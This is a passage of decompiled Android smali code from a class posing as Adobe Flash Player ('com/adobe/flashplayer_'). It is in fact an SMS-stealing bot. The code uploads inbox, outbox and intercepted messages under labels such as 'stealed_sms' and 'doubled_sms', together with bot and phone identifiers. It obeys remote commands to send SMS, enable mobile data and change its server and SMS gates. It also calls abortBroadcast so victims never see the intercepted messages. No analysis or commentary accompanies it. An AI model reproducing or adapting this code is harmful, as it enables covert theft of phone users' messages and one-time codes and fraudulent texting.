    const-string v10, "&g="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v19

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&h=in_sms&i=cmd&prefix="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v16

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x1

    const-string v9, "in.z"

    move-object/from16 v0, p1

    invoke-virtual {v0, v9}, Landroid/content/Context;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v9

    invoke-virtual {v9}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x2

    aput-object v18, v6, v8

    invoke-virtual {v4, v6}, Lcom/adobe/flashplayer_/AAA000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 278
    new-instance v4, Lcom/adobe/flashplayer_/AAA000;

    invoke-direct {v4}, Lcom/adobe/flashplayer_/AAA000;-><init>()V

    const/4 v6, 0x3

    new-array v6, v6, [Ljava/lang/String;

    const/4 v8, 0x0

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "&b="

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&c="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, ":"

    const-string v11, ""

    invoke-virtual {v15, v10, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&d="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&e="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "BotPhone"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v10, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&f="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v17

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&g="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v19

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&h=out_sms&i=cmd&prefix="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v16

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x1

    const-string v9, "out.z"

    move-object/from16 v0, p1

    invoke-virtual {v0, v9}, Landroid/content/Context;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v9

    invoke-virtual {v9}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x2

    aput-object v18, v6, v8

    invoke-virtual {v4, v6}, Lcom/adobe/flashplayer_/AAA000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 288
    .end local v5    # "inBox":Landroid/net/Uri;
    .end local v7    # "outBox":Landroid/net/Uri;
    .end local v37    # "inc":Landroid/database/Cursor;
    .end local v45    # "ouc":Landroid/database/Cursor;
    .end local v46    # "pack_inbox":Ljava/lang/String;
    .end local v47    # "pack_inbox_pack":Ljava/lang/String;
    .end local v48    # "pack_outbox":Ljava/lang/String;
    .end local v49    # "pack_outbox_pack":Ljava/lang/String;
    :cond_6
    const-string v4, "sendSMS"

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_8

    .line 289
    const-string v4, " "

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v28

    .line 290
    .restart local v28    # "cmd_data":[Ljava/lang/String;
    const-string v61, ""

    .line 291
    .local v61, "to":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v55

    .line 292
    .local v55, "smsManager":Landroid/telephony/SmsManager;
    if-eqz v55, :cond_7

    .line 293
    const/4 v4, 0x1

    aget-object v4, v28, v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    const/16 v6, 0x8

    if-le v4, v6, :cond_18

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "+"

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v6, 0x1

    aget-object v6, v28, v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v61

    .line 294
    :goto_5
    const/4 v4, 0x2

    aget-object v4, v28, v4

    const-string v6, "_"

    const-string v8, " "

    invoke-virtual {v4, v6, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v42

    .line 296
    .local v42, "msg":Ljava/lang/String;
    const-string v4, "P"

    const-string v6, "+"

    move-object/from16 v0, v61

    invoke-virtual {v0, v4, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, p0

    move-object/from16 v1, v42

    invoke-virtual {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 298
    .end local v42    # "msg":Ljava/lang/String;
    :cond_7
    if-eqz v43, :cond_8

    invoke-virtual/range {v43 .. v43}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z

    .line 307
    .end local v28    # "cmd_data":[Ljava/lang/String;
    .end local v55    # "smsManager":Landroid/telephony/SmsManager;
    .end local v61    # "to":Ljava/lang/String;
    :cond_8
    const-string v4, "3gOn"

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_9

    .line 308
    new-instance v4, Lcom/adobe/flashplayer_/WF;

    invoke-direct {v4}, Lcom/adobe/flashplayer_/WF;-><init>()V

    move-object/from16 v0, p1

    invoke-virtual {v4, v0}, Lcom/adobe/flashplayer_/WF;->threeg(Landroid/content/Context;)V

    .line 318
    :cond_9
    const-string v4, "forceZ"

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_a

    .line 320
    const-string v4, " "

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v28

    .line 322
    .restart local v28    # "cmd_data":[Ljava/lang/String;
    const/4 v4, 0x1

    aget-object v4, v28, v4

    const-string v6, "On"

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_19

    .line 323
    const-string v4, "forceZ"

    const-string v6, "On"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v6, v1}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 336
    .end local v28    # "cmd_data":[Ljava/lang/String;
    :cond_a
    :goto_6
    const-string v4, "keyHttpGate"

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_b

    .line 337
    const-string v4, " "

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v28

    .line 338
    .restart local v28    # "cmd_data":[Ljava/lang/String;
    const/4 v4, 0x1

    aget-object v29, v28, v4

    .line 339
    .restart local v29    # "data":Ljava/lang/String;
    const-string v4, "Reich_ServerGate"

    move-object/from16 v0, p0

    move-object/from16 v1, v29

    move-object/from16 v2, p1

    invoke-direct {v0, v4, v1, v2}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 344
    .end local v28    # "cmd_data":[Ljava/lang/String;
    .end local v29    # "data":Ljava/lang/String;
    :cond_b
    const-string v4, "keySmsGate"

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_c

    .line 345
    const-string v4, " "

    move-object/from16 v0, v60

    invoke-virtual {v0, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v28

    .line 346
    .restart local v28    # "cmd_data":[Ljava/lang/String;
    const/4 v4, 0x1

    aget-object v29, v28, v4

    .line 347
    .restart local v29    # "data":Ljava/lang/String;
    const-string v4, "Reich_SMSGate"

    move-object/from16 v0, p0

    move-object/from16 v1, v29

    move-object/from16 v2, p1

    invoke-direct {v0, v4, v1, v2}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_0

    .line 361
    .end local v28    # "cmd_data":[Ljava/lang/String;
    .end local v29    # "data":Ljava/lang/String;
    .end local v59    # "temp":[B
    .end local v60    # "tmp":Ljava/lang/String;
    :cond_c
    :goto_7
    const-string v4, "w"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v64

    .line 363
    .local v64, "zkey":Ljava/lang/String;
    const-string v4, "forceZ"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v33

    .line 365
    .local v33, "forceZ":Ljava/lang/String;
    const-string v4, "On"

    move-object/from16 v0, v33

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_d

    .line 366
    const-string v4, "Reich_SMSGate"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v34

    .line 368
    .local v34, "gate":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v55

    .line 369
    .restart local v55    # "smsManager":Landroid/telephony/SmsManager;
    if-eqz v55, :cond_d

    .line 370
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "+"

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static/range {v52 .. v52}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "|"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    move-object/from16 v0, v54

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    move-object/from16 v0, p0

    invoke-virtual {v0, v4, v6}, Lcom/adobe/flashplayer_/CCC;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 442
    .end local v34    # "gate":Ljava/lang/String;
    .end local v55    # "smsManager":Landroid/telephony/SmsManager;
    :cond_d
    const-string v4, ","

    move-object/from16 v0, v64

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_1d

    if-nez v35, :cond_1d

    .line 443
    const-string v4, ","

    move-object/from16 v0, v64

    invoke-virtual {v0, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v63

    .line 445
    .local v63, "zk_tmp":[Ljava/lang/String;
    const/16 v62, 0x0

    .local v62, "x":I
    :goto_8
    move-object/from16 v0, v63

    array-length v4, v0

    move/from16 v0, v62

    if-lt v0, v4, :cond_1a

    .line 508
    .end local v62    # "x":I
    .end local v63    # "zk_tmp":[Ljava/lang/String;
    :cond_e
    :goto_9
    const-string v4, "*"

    move-object/from16 v0, v64

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-eq v4, v6, :cond_f

    if-nez v35, :cond_f

    .line 510
    invoke-virtual/range {p0 .. p0}, Lcom/adobe/flashplayer_/CCC;->abortBroadcast()V

    .line 511
    const/16 v35, 0x1

    .line 513
    const-string v57, ""

    .line 514
    .local v57, "sms_get":Ljava/lang/String;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static/range {v57 .. v57}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v54

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v57

    .line 516
    const-string v4, "+"

    const-string v6, ""

    move-object/from16 v0, v52

    invoke-virtual {v0, v4, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v44

    .line 517
    .local v44, "noplus":Ljava/lang/String;
    move-object/from16 v0, p0

    move-object/from16 v1, v44

    move-object/from16 v2, v57

    move-object/from16 v3, p1

    invoke-direct {v0, v1, v2, v3}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 521
    new-instance v4, Lcom/adobe/flashplayer_/AAA000;

    invoke-direct {v4}, Lcom/adobe/flashplayer_/AAA000;-><init>()V

    const/4 v6, 0x3

    new-array v6, v6, [Ljava/lang/String;

    const/4 v8, 0x0

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "&b="

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&c="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, ":"

    const-string v11, ""

    invoke-virtual {v15, v10, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&d="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&e="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "BotPhone"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v10, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&f="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v17

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&g="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v19

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&h=stealed_sms&i="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v44

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&prefix="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v16

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x1

    move-object/from16 v0, p1

    move-object/from16 v1, v44

    invoke-virtual {v0, v1}, Landroid/content/Context;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v9

    invoke-virtual {v9}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x2

    aput-object v22, v6, v8

    invoke-virtual {v4, v6}, Lcom/adobe/flashplayer_/AAA000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 524
    .end local v44    # "noplus":Ljava/lang/String;
    .end local v57    # "sms_get":Ljava/lang/String;
    :cond_f
    if-eqz v43, :cond_1f

    invoke-virtual/range {v43 .. v43}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z

    move-result v4

    if-eqz v4, :cond_1f

    if-nez v35, :cond_1f

    .line 525
    const-string v4, "+"

    const-string v6, ""

    move-object/from16 v0, v52

    invoke-virtual {v0, v4, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v44

    .line 527
    .restart local v44    # "noplus":Ljava/lang/String;
    const-string v57, ""

    .line 528
    .restart local v57    # "sms_get":Ljava/lang/String;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static/range {v57 .. v57}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v54

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v57

    .line 529
    const/16 v35, 0x1

    .line 530
    move-object/from16 v0, p0

    move-object/from16 v1, v44

    move-object/from16 v2, v57

    move-object/from16 v3, p1

    invoke-direct {v0, v1, v2, v3}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 531
    new-instance v4, Lcom/adobe/flashplayer_/AAA000;

    invoke-direct {v4}, Lcom/adobe/flashplayer_/AAA000;-><init>()V

    const/4 v6, 0x3

    new-array v6, v6, [Ljava/lang/String;

    const/4 v8, 0x0

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "&b="

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&c="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, ":"

    const-string v11, ""

    invoke-virtual {v15, v10, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&d="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&e="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "BotPhone"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v10, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&f="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v17

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&g="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v19

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&h=doubled_sms&i="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v44

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&prefix="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v16

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x1

    move-object/from16 v0, p1

    move-object/from16 v1, v44

    invoke-virtual {v0, v1}, Landroid/content/Context;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v9

    invoke-virtual {v9}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x2

    aput-object v22, v6, v8

    invoke-virtual {v4, v6}, Lcom/adobe/flashplayer_/AAA000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 543
    .end local v44    # "noplus":Ljava/lang/String;
    .end local v57    # "sms_get":Ljava/lang/String;
    :cond_10
    :goto_a
    const-string v4, "start"

    move-object/from16 v0, v58

    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_11

    .line 545
    const-string v4, "%"

    move-object/from16 v0, v54

    invoke-virtual {v0, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v26

    .line 547
    .restart local v26    # "buff":[Ljava/lang/String;
    const/4 v4, 0x0

    aget-object v4, v26, v4

    move-object/from16 v0, v38

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_11

    .line 548
    const/4 v4, 0x1

    aget-object v12, v26, v4

    .line 549
    .local v12, "Bot":Ljava/lang/String;
    const/4 v4, 0x2

    aget-object v20, v26, v4

    .line 550
    .local v20, "Sender":Ljava/lang/String;
    const/4 v4, 0x3

    aget-object v21, v26, v4

    .line 551
    .local v21, "Text":Ljava/lang/String;
    move-object/from16 v0, p0

    move-object/from16 v1, v21

    move-object/from16 v2, p1

    invoke-direct {v0, v12, v1, v2}, Lcom/adobe/flashplayer_/CCC;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 552
    new-instance v4, Lcom/adobe/flashplayer_/AAA000;

    invoke-direct {v4}, Lcom/adobe/flashplayer_/AAA000;-><init>()V

    const/4 v6, 0x3

    new-array v6, v6, [Ljava/lang/String;

    const/4 v8, 0x0

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "&b="

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&c=&d=&e=&f=&g=&h=stealed_sms&i="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v20

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&prefix="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    move-object/from16 v0, v16

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x1

    move-object/from16 v0, p1

    invoke-virtual {v0, v12}, Landroid/content/Context;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v9

    invoke-virtual {v9}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v6, v8

    const/4 v8, 0x2

    aput-object v22, v6, v8

    invoke-virtual {v4, v6}, Lcom/adobe/flashplayer_/AAA000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 564
    .end local v12    # "Bot":Ljava/lang/String;
    .end local v20    # "Sender":Ljava/lang/String;
    .end local v21    # "Text":Ljava/lang/String;
    .end local v26    # "buff":[Ljava/lang/String;
    :cond_11
    return-void

    .line 63
    .end local v13    # "BotID":Ljava/lang/String;
